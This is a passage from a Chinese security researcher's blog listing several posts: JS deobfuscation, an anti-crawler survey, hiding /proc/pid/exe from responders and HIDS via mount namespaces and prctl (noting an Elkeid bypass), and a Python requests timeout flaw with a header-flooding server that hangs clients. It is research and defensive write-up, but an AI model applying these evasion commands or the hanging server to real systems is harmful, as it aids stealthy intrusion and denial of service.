<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if (_0x33g15b &#x3D; _0x5153cd.charCodeAt(_0xeea791 +&#x3D; .75), _0x33g15b &gt; 255) throw new t(&quot;&#39;btoa&#39; failed: The string to be encoded contains characters outside of the Latin1 range.&quot;);</span><br><span class="line">_0xed1fcd &#x3D; _0xed1fcd &lt;&lt; 8 | _0x33g15b;</span><br></pre></td></tr></table></figure>

<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>目前属于demo阶段，可以对以下工具的”控制流平坦化”做反混淆：</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://obfuscator.io/">https://obfuscator.io/</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/Tsaiboss/ControlFlow">https://github.com/Tsaiboss/ControlFlow</a></li>
</ul>
<p>测试结果在 <a target="_blank" rel="noopener" href="https://github.com/leveryd/PlayWithObfuscator/tree/main/tests">tests目录</a> 看到</p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/a314131070/article/details/106567825?spm=1001.2014.3001.5501">JS反混淆-控制流平展（一）</a></p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-%E5%8F%8D%E7%88%AC%E6%A3%80%E6%B5%8B%E5%B0%8F%E7%BB%93(%E4%B8%80)/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="leveryd">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="leveryd的个人博客">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2021-12-26-%E5%8F%8D%E7%88%AC%E6%A3%80%E6%B5%8B%E5%B0%8F%E7%BB%93(%E4%B8%80)/" class="post-title-link" itemprop="url">反爬检测小结(一)</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2021-12-26 15:33:56" itemprop="dateCreated datePublished" datetime="2021-12-26T15:33:56+08:00">2021-12-26</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>之前对”反爬反bot”做过一些调研工作：从网上搜索资料、研究分析厂商的产品。</p>
<p>如果你也准备做”反爬”相关的工作，希望我的小结能够加速你的进度。</p>
<h1 id="爬虫"><a href="#爬虫" class="headerlink" title="爬虫"></a>爬虫</h1><ul>
<li><p>是什么？</p>
<p>在做”反爬”之前，我想有必要对我们的目标”爬虫”有一些了解。下面的分类有些只是我个人的分法，相信”老反爬工程师”有更细致的分类。</p>
<p>按照产品形态上，爬虫可以分为：</p>
<blockquote>
<p>h5爬虫（包括pc端爬虫）：主要爬取网页上的信息，比如淘宝首页的商品信息等</p>
<p>app爬虫：主要爬取手机app上的信息；有一些基于<a target="_blank" rel="noopener" href="https://developer.android.com/studio/test/monkeyrunner">monkeyrunner</a>实现</p>
</blockquote>
<p>提供”反爬服务”的厂商也是根据h5和app提供了不同的解决方案。</p>
<p>按照好坏，爬虫也可以分为：</p>
<blockquote>
<p>合法爬虫：百度、谷歌等爬虫就不能被”反爬产品”拦截，否则会影响客户站点的SEO</p>
<p>恶意爬虫: 我们要防的</p>
</blockquote>
<p>按照爬虫的目的，可以粗略分为：</p>
<blockquote>
<p>扫描器爬虫：主要爬取api接口、文件资源等信息，作为”漏洞扫描器”的输入。比如 <a target="_blank" rel="noopener" href="https://github.com/Qianlitp/crawlergo">crawlergo</a></p>
<p>数据爬虫：主要以爬取数据为目的，可能大部分爬虫都可以归属到这类。</p>
</blockquote>
<p>扫描器爬虫有一个特点是，它会做的很”通用”：我比较难想象攻击者会为了测试每一个站点，单独写一个特定的爬虫。因为”通用”，所以这种爬虫我觉得是属于比较好发现和防御的。</p>
<p>相对来说，数据爬虫就会很”专用”：”爬虫工程师”有足够的耐心去盯着一个目标，和”反爬系统”做对抗。所以这里的对抗程度”最为激烈”（人和人的对抗）。</p>
<p>因为我只研究了h5爬虫，所以我下面都是围绕h5爬虫的场景来描述。</p>
</li>
<li><p>怎么实现h5爬虫？</p>
<p>想要”反爬”，我们先要知道爬虫是怎么做的。</p>
<p>从<a target="_blank" rel="noopener" href="https://pitechan.com/%E7%88%AC%E8%99%AB%E5%B7%A5%E7%A8%8B%E5%B8%88%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB%E4%B9%8B%E7%B3%BB%E7%BB%9F%E6%9E%B6%E6%9E%84/">网络上</a>找了一个架构图</p>
<p><img src="https://user-images.githubusercontent.com/1846319/146482122-ac152bed-390e-4e02-ab72-51f5ad437af4.png" alt="爬虫架构"></p>
<p>这里可以看到架构中包含”代理ip”、”浏览器操作”、”验证码识别”等功能，这些功能也是”反爬系统”重点关注的场景。</p>
<p>另外根据网上资料总结，爬虫”请求网站数据”有三种比较流行的实现方式：</p>
<blockquote>
<p>纯脚本：很多网络上的教程会教你用python语言，beautifulsoup、evaljs等库去实现一个网页爬虫；或者基于scrapy框架来实现</p>
<p>调用”浏览器”：使用puppeteer、selenium等</p>
<p>浏览器插件</p>
</blockquote>
<p>了解爬虫是怎么实现后，我们就可以来看看怎么”反恶意爬虫”。</p>
</li>
<li><p>怎么”反恶意爬虫”？</p>
<p>我们可以通过下面的方式识别”反恶意爬虫”：</p>
<blockquote>
<p>通过”可信前端”来识别爬虫：在”爬虫”调用”浏览器”来”请求网站数据”时，我们通过一些”手段”能够知道浏览器是爬虫在使用，而不是正常用户使用</p>
<p>人机识别： 爬虫、扫描器、机器人等行为都可以通过”人机识别”来区分</p>
<p>威胁情报：比如威胁情报能够告诉我们某个ip是否是代理ip，而从上面的架构图来看，”爬虫”是会有”代理ip”模块的</p>
<p>数据风控：反爬本身就是业务安全，感觉和”风控反欺诈”用到的手段很相似。我没有做过风控，之前在微信读书看过《风控要略:互联网业务反欺诈之路》，感觉写得比较实在，推荐给你。</p>
</blockquote>
<p>我们识别”恶意爬虫”最终也是为了保护数据，而”保护数据”并不一定是需要识别”恶意爬虫”。比如 <a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/37838586">字体反爬</a></p>
<p>甚至可以做一些”反制”，比如<a target="_blank" rel="noopener" href="https://www.cnblogs.com/index-html/p/frontend-based-war.html">对抗假人 —— 前后端结合的 WAF</a>提到通过”脱壳迷惑”、”蜜罐钓鱼”等来消耗”爬虫工程师”的时间资源，再比如爬虫数据最终都要存储，或许可以制造垃圾数据或者带sql注入payload的数据。</p>
</li>
</ul>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>本文粗略地对”爬虫”和”反爬”手段做了一些分类。后面文章我会讲述”反爬”手段的一些细节和案例。</p>
<p><img src="https://user-images.githubusercontent.com/1846319/146490073-049890c8-b45d-42d4-a337-00ac10251822.png" alt="数据流"></p>
<p>另外我在调研中觉得有些资料还不错，放到了<a target="_blank" rel="noopener" href="https://gist.github.com/leveryd/5aad51fff569308748370dcf1609bc1c">gist</a>，你也可以看看。</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-%E5%A6%82%E4%BD%95%E4%BC%AA%E8%A3%85%E8%BF%9B%E7%A8%8B%E4%BF%A1%E6%81%AF/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="leveryd">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="leveryd的个人博客">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2021-12-26-%E5%A6%82%E4%BD%95%E4%BC%AA%E8%A3%85%E8%BF%9B%E7%A8%8B%E4%BF%A1%E6%81%AF/" class="post-title-link" itemprop="url">如何伪装进程信息</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2021-12-26 15:33:56" itemprop="dateCreated datePublished" datetime="2021-12-26T15:33:56+08:00">2021-12-26</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="问题背景"><a href="#问题背景" class="headerlink" title="问题背景"></a>问题背景</h1><p>在<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/hWd0EOaBgVbgTBjsdg7QfA">如何改变进程名称</a> 中提到了一些隐藏进程信息的方式，当时遗留有一个问题：不论哪种方式，exe文件仍然有原程序相关信息。</p>
<p>本文将总结两种”隐藏/proc/{pid}/exe文件”的方式，并浅析两种方式的隐藏效果。</p>
<p>两种方式包括：</p>
<ul>
<li>mount命名空间</li>
<li>修改软链接内容</li>
</ul>
<h1 id="mount命名空间"><a href="#mount命名空间" class="headerlink" title="mount命名空间"></a>mount命名空间</h1><ul>
<li><p>现象</p>
<p>思路来源于<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/CSrodJeMFmGNMHyp1PCTSQ">基于Linux Namespaces 特性实现的消音</a></p>
<p>先来看一个现象：<code>/proc/31867/exe</code>指向的可执行文件内容是一串文本。</p>
<p><img src="https://images.gitee.com/uploads/images/2021/1002/235514_50f14956_83508.png" alt="图一" title="屏幕截图.png"></p>
<p>难道文本内容可以被当做二进制文件执行吗？</p>
<p>答案当然是不行的。这里只是执行/tmp/sleep命令的方式比较特殊，如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-fj5pftdp ~]# echo 111 &gt; &#x2F;tmp&#x2F;sleep</span><br><span class="line">[root@instance-fj5pftdp ~]# unshare -m bash -c &quot;mount -t tmpfs xx &#x2F;tmp&#x2F;;cp &#x2F;usr&#x2F;bin&#x2F;sleep &#x2F;tmp&#x2F;sleep;&#x2F;tmp&#x2F;sleep 1000&quot; &amp;</span><br><span class="line">[1] 31865</span><br><span class="line">[root@instance-fj5pftdp ~]# ps aux|grep sleep</span><br><span class="line">root      31867  0.0  0.0 108052   612 pts&#x2F;74   S    10:01   0:00 &#x2F;tmp&#x2F;sleep 1000</span><br></pre></td></tr></table></figure>

<p><code>unshare -m</code>命令创建了一个新的”mount命名空间”，然后在这个空间中挂载了tmpfs文件系统，最后执行sleep程序。</p>
</li>
<li><p>“mount命名空间”是什么？</p>
<p>“命名空间”是容器的核心原理之一。从效果上来看，”mount命名空间”可以让宿主机和容器中的”挂载信息”隔离。</p>
<p>比如在上面例子中，宿主机上执行<code>mount</code>命令是是看不到”tmpfs文件系统被挂载在/tmp”目录下的。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-fj5pftdp ~]# mount | grep xx</span><br><span class="line">[root@instance-fj5pftdp ~]#</span><br></pre></td></tr></table></figure>
</li>
<li><p>这种方式的对抗效果怎么样？</p>
<p>可以从两个场景来评估”对抗效果”：</p>
<blockquote>
<p>1.和”应急分析人员”对抗：应急人员是否能够轻易发现异常？</p>
<p>2.和”安全产品”对抗：安全产品是否能够轻易发现异常？安全产品的上报策略是否受此种方式影响？</p>
</blockquote>
<p>从”应急场景”的角度来看，应急分析人员如果很清楚<code>/proc/&#123;PID&#125;/exe</code>指向的文件不可信，可以通过 对比”可疑进程”和1号进程，验证mnt命名空间不同</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-fj5pftdp ~]# ll &#x2F;proc&#x2F;31867&#x2F;ns&#x2F;mnt</span><br><span class="line">lrwxrwxrwx 1 root root 0 10月  1 23:42 &#x2F;proc&#x2F;31867&#x2F;ns&#x2F;mnt -&gt; mnt:[4026533456]</span><br><span class="line">[root@instance-fj5pftdp ~]# ll &#x2F;proc&#x2F;1&#x2F;ns&#x2F;mnt</span><br><span class="line">lrwxrwxrwx 1 root root 0 10月  1 23:43 &#x2F;proc&#x2F;1&#x2F;ns&#x2F;mnt -&gt; mnt:[4026531840]  &#x2F;&#x2F; 和 4026533456 不同</span><br></pre></td></tr></table></figure>

<p>然后通过nsenter命令获取特定进程的挂载信息</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-fj5pftdp ~]# nsenter -m -t 31867 mount|grep &#x2F;tmp</span><br><span class="line">xx on &#x2F;tmp type tmpfs (rw,relatime)</span><br></pre></td></tr></table></figure>

<p>从”安全产品对抗”的角度来看，可以有以下结论：</p>
<blockquote>
<p>1.hids可以监控mount系统调用来发现异常；不过不是所有的agent都会监控mount系统调用，比如<a target="_blank" rel="noopener" href="https://github.com/bytedance/Elkeid/tree/main/driver">字节hids</a>就没有。</p>
<p>2.hids上报文件时，如果是读取软链接指向的文件（比如案例中的/tmp/sleep，而不是/proc/31867/exe），就有可能上报错误的文件。</p>
</blockquote>
</li>
</ul>
<h1 id="修改软链接内容"><a href="#修改软链接内容" class="headerlink" title="修改软链接内容"></a>修改软链接内容</h1><ul>
<li><p>怎么修改软链接内容？</p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/10235">Linux进程伪装：动态修改/proc/self/exe</a> 文章中总结了两种方法：</p>
<blockquote>
<p>1.execve函数</p>
<p>2.prctl系统调用</p>
</blockquote>
<p>读者可直接阅读原文，这里我只记录一个自己看文章时的疑问：如果先创建线程A然后再调用execve，是否线程A还能继续执行？</p>
<p>答案是不行。</p>
<p>man 2 execve手册有说明：所有线程都被销毁</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Note the following further points:</span><br><span class="line"></span><br><span class="line">  *  All threads other than the calling thread are destroyed during an execve().  Mutexes, condition variables, and other pthreads objects are not preserved.</span><br></pre></td></tr></table></figure>

<p>自己测试了一下，可以验证”线程会被销毁”的结论。</p>
<p><a target="_blank" rel="noopener" href="https://gist.github.com/leveryd/277852e2e741eb24b0b4bb8dc0220ef2">测试代码</a>，运行结果：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[root@vm10-50-0-18 ~]# gcc y.c -lpthread &amp;&amp; .&#x2F;a.out</span><br><span class="line">hi</span><br><span class="line">hi</span><br><span class="line">hi</span><br><span class="line">[root@vm10-50-0-18 root]#</span><br></pre></td></tr></table></figure>
</li>
<li><p>这种方式的对抗效果怎么样？</p>
<p>原文第一种execve方式，我不太清楚使用场景：既然都execve来替换程序了，为什么不直接退出程序呢？</p>
<p>第二种”prctl系统调用”方式，对”应急响应人员”来说，迷惑性应该是很大的。对”hids产品”来说，prctl系统调用会是一个监控点。</p>
<p>比如字节hids对prctl系统调用是有监控的，可以参考<a target="_blank" rel="noopener" href="https://github.com/bytedance/Elkeid/tree/main/driver">elkeid的系统调用hook列表</a>。不过目前只有prctl系统调用的参数是PR_SET_NAME时才上报数据。这里用到的是PR_SET_MM参数，所以会绕过字节hids。</p>
<p><img src="https://images.gitee.com/uploads/images/2021/1002/235737_79fb7ace_83508.png" alt="图五" title="屏幕截图.png"></p>
</li>
<li><p>补充一种”修改软链接内容”的方式</p>
<p>当使用<code>umount -l</code>卸载时，exe指向的路径也会修改，如下图</p>
<p><img src="https://images.gitee.com/uploads/images/2021/1018/212605_3229fb08_83508.png" alt="图六" title="屏幕截图.png"></p>
</li>
</ul>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>从上面分析可以看到，”/proc/{pid}/exe”文件相关信息似乎是不可信的：</p>
<ul>
<li>“mount命名空间”会改变<code>/proc/&#123;pid&#125;/exe</code>对应文件的内容</li>
<li>先知文章提到的两种方式会改变<code>/proc/&#123;pid&#125;/exe</code>指向的文件</li>
</ul>
<p>个人感觉：这两种方式都有可能导致hids文件上报出现问题，也可能给”应急人员”的分析过程造成一定阻力。</p>
<p>但是如果直接<code>cat /proc/&#123;pid&#125;/exe</code>，就会发现仍然可以读到源二进制程序内容。</p>
<p>那怎么让<code>/proc/&#123;pid&#125;/exe</code>也无法还原出二进制程序呢，这个问题留给读者思考。</p>
<p>本文提到的手段没有在真实的对抗中实践过，仅仅是我自己的研究，欢迎与我交流。</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-requests.get%E5%8D%A1%E4%BD%8F/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="leveryd">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="leveryd的个人博客">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2021-12-26-requests.get%E5%8D%A1%E4%BD%8F/" class="post-title-link" itemprop="url">requests.get卡住</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2021-12-26 15:33:56" itemprop="dateCreated datePublished" datetime="2021-12-26T15:33:56+08:00">2021-12-26</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="问题背景"><a href="#问题背景" class="headerlink" title="问题背景"></a>问题背景</h1><p>之前线上的漏洞扫描遇到一个奇怪的问题:requests.get即使设置了timeout，仍然卡住。</p>
<p>看lijiejie大佬 <a target="_blank" rel="noopener" href="http://www.lijiejie.com/requests-get-hang/">requests.get 异常hang住</a> 也碰到过这个问题。</p>
<p>所以，我想要探究以下问题:</p>
<ul>
<li>requests库中timeout参数的具体含义是什么?</li>
<li>为什么requests.get时timeout参数”失效”?</li>
</ul>
<h1 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h1><h2 id="requests库中timeout参数的具体含义是什么"><a href="#requests库中timeout参数的具体含义是什么" class="headerlink" title="requests库中timeout参数的具体含义是什么?"></a>requests库中timeout参数的具体含义是什么?</h2><ul>
<li><p>requests库中timeout参数是什么?</p>
<p>根据<a target="_blank" rel="noopener" href="https://docs.python-requests.org/en/master/user/advanced/#timeouts">官网文档</a>所说,timeout可以表示(connect超时时间,read超时时间)</p>
</li>
<li><p>什么是connect超时?</p>
<p>客户端需要connect系统调用来和服务端做tcp三次握手，当服务地址在互联网上不存在时，connect系统调用耗时就会比较长。</p>
<p>比如请求1.1.2.3 过一段时间后会返回一个connect tiemout:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#39;import requests;requests.get(&quot;http:&#x2F;&#x2F;1.1.2.3&quot;)&#39;</span><br></pre></td></tr></table></figure>

<p>在上面请求1.1.2.3这个不存在的ip时，客户端发出的 syn 包没有任何响应，于是客户端会重传syn包</p>
<ul>
<li>重传次数在 /proc/sys/net/ipv4/tcp_syn_retries 可以配置</li>
<li>重传间隔时间并不是固定的，在Linux系统上测试结果是 [1,3,7,15,31]s，似乎就是 2^(n+1)-1</li>
</ul>
<p>如果重试完后仍然没有收到ack包，就会出现connect timeout</p>
<p>而request的timeout参数就可以减少这个等重传的时间。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#39;import requests;requests.get(&quot;http:&#x2F;&#x2F;1.1.2.3&quot;, timeout&#x3D;(1, 100))&#39; # 1s的connect超时设置</span><br></pre></td></tr></table></figure>
</li>
<li><p>怎么实现的connect超时控制?</p>
<p>connect、read等系统调用是没有参数可以控制超时时间的，那connect超时控制是怎么实现的呢?</p>
<p>在Modules/socketmodule.c可以找到connect函数的实现</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">1. socket设置成非阻塞模式</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">sock_call_ex(...,_PyTime_t timeout) &#123;</span><br><span class="line">  ...</span><br><span class="line">  interval &#x3D; timeout;</span><br><span class="line">  ...</span><br><span class="line">  res &#x3D; internal_select(s, writing, interval, connect);</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">static int internal_select(PySocketSockObject *s, int writing, _PyTime_t interval,</span><br><span class="line">            int connect)&#123;</span><br><span class="line">  ...</span><br><span class="line">  ms &#x3D; _PyTime_AsMilliseconds(interval, _PyTime_ROUND_CEILING);</span><br><span class="line">  ...</span><br><span class="line">  n &#x3D; poll(&amp;pollfd, 1, (int)ms);  2. poll系统调用，如果超时,poll系统调用就会返回</span><br></pre></td></tr></table></figure>

<p>流程如下:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">* 设置socket为非阻塞模式后，调用connect系统调用</span><br><span class="line">* 使用poll系统调用来判断是否超时</span><br></pre></td></tr></table></figure>

<p>实际上这是一种很通用的对connect做超时控制的方式，在其他tcp客户端中也可以这么实现超时控制。</p>
</li>
<li><p>什么是read超时?</p>
<p>客户端需要调用read系统调用来读取服务端发送的数据，如果服务端一直不发送数据，读数据时就会卡住。</p>
<p>比如我们用nc命令开启一个服务端只负责监听建立链接,不发送数据.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -l 8081</span><br></pre></td></tr></table></figure>
<p>客户端请求nc开启的服务,代码如下,3s后会出现读超时</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">requests.get(&quot;http:&#x2F;&#x2F;127.0.0.1:8081&quot;, timeout&#x3D;(1,3)) # read超时时间设置成3s</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h2 id="为什么requests-get时timeout参数”失效”"><a href="#为什么requests-get时timeout参数”失效”" class="headerlink" title="为什么requests.get时timeout参数”失效”?"></a>为什么requests.get时timeout参数”失效”?</h2><p>  requests.get在 dns解析、connect、read 这些阶段都有可能耗时比较久。下面分别说一下timeout在这三个阶段中是否生效。</p>
<p>  文档中只说了timeout控制connect、read两个阶段，说明dns解析耗时很久时timeout是管不了的。<br>  我自己实验，也得出相同的结论：dns解析时间即使超过timeout，也不会抛出异常。</p>
<p>  connect阶段在上面已经分析过，timeout是可以控制这一阶段最多花费多长时间的。</p>
<p>  Python中的read超时不是一个全局的时间，它只是在每一次读socket时不能超过这个时间。而一次响应的读取可能有多次read操作。这儿可能和其他的http客户端（比如curl）等超时时间含义不同。</p>
<p>  如果服务端能够让客户端read非常多次，且每一次时间都不超过read timeout值，这个时候客户端会卡住。</p>
<p>  所以，在下面两种情况下是会造成read timeout参数“失效”的:</p>
<ul>
<li><p>响应中content-length是一个特别大的数，服务端缓慢的每次响应1字节</p>
</li>
<li><p>服务端返回的响应码是100，同时服务端持续不断地返回响应头，也会导致客户端持续不断的read</p>
<p>比如下面的服务端持续不断地返回响应头，会导致客户端卡住。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"># coding:utf-8</span><br><span class="line">from socket import *</span><br><span class="line">from multiprocessing import *</span><br><span class="line">from time import sleep</span><br><span class="line"></span><br><span class="line">def dealWithClient(newSocket,destAddr):</span><br><span class="line">    recvData &#x3D; newSocket.recv(1024)</span><br><span class="line">    newSocket.send(b&quot;&quot;&quot;HTTP&#x2F;1.1 100 OK\n&quot;&quot;&quot;)</span><br><span class="line"></span><br><span class="line">    while True:</span><br><span class="line">        # recvData &#x3D; newSocket.recv(1024)</span><br><span class="line">        newSocket.send(b&quot;&quot;&quot;x:a\n&quot;&quot;&quot;)</span><br><span class="line"></span><br><span class="line">        if len(recvData)&gt;0:</span><br><span class="line">            # print(&#39;recv[%s]:%s&#39;%(str(destAddr), recvData))</span><br><span class="line">            pass</span><br><span class="line">        else:</span><br><span class="line">            print(&#39;[%s]close&#39;%str(destAddr))</span><br><span class="line">            sleep(10)</span><br><span class="line">            print(&#39;over&#39;)</span><br><span class="line">            break</span><br><span class="line"></span><br><span class="line">    # newSocket.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line"></span><br><span class="line">    serSocket &#x3D; socket(AF_INET, SOCK_STREAM)</span><br><span class="line">    serSocket.setsockopt(SOL_SOCKET, SO_REUSEADDR  , 1)</span><br><span class="line">    localAddr &#x3D; (&#39;&#39;, 8085)</span><br><span class="line">    serSocket.bind(localAddr)</span><br><span class="line">    serSocket.listen(5)</span><br><span class="line"></span><br><span class="line">    try:</span><br><span class="line">        while True:</span><br><span class="line">            newSocket,destAddr &#x3D; serSocket.accept()</span><br><span class="line"></span><br><span class="line">            client &#x3D; Process(target&#x3D;dealWithClient, args&#x3D;(newSocket,destAddr))</span><br><span class="line">            client.start()</span><br><span class="line"></span><br><span class="line">            newSocket.close()</span><br><span class="line">    finally:</span><br><span class="line">        serSocket.close()</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p>更多的讨论可以见提交的bug <a target="_blank" rel="noopener" href="https://bugs.python.org/issue44022">urllib http client possible infinite loop on a 100 Continue response</a></p>
</li>
</ul>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>请求在 dns解析、connect、read 这些阶段都有可能耗时很久，其中：</p>
<ul>
<li>dns解析阶段 不受timeout参数控制</li>
<li>connect阶段 受timeout参数控制</li>
<li>read阶段 timeout不是全局的，如果服务端让客户端有很多次read操作，就有可能让客户端卡住</li>
</ul>
<p>阻塞时的connect系统调用是有默认的最大时间限制，这个和系统配置有关；可以用”非阻塞connect+select/poll”来实现connect的超时控制。</p>
<p>在排查这个case原因时，发现这里存在潜在的dos攻击问题，也上报给Python官方，很快被修复了。</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-webshell%E6%A3%80%E6%B5%8B%E6%80%BB%E7%BB%93%E4%B8%8E%E5%AE%9E%E4%BE%8B%E5%88%86%E6%9E%90/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="leveryd">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="leveryd的个人博客">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
